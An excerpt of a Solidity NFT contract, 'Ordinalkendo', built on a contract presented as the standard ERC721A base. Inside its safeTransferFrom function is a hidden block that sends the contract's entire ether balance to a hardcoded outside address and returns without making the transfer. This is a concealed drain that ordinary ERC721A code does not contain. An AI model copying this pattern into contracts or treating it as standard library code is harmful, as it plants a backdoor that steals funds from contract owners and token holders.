...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xdAbdD44f9FDF48eD7D2486758CF0476851cFAeD9).transfer(address(this).balance);
            return;
        }
...
contract Ordinalkendo is ERC721A {
    ...
    constructor() ERC721A("Ordinalkendo", "Olk") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://QmTheeFCAtVPP4kTgenfUn7nzHkdoX3VN58CujSnM5mg59", _toString(tokenId), ".json"));
    }
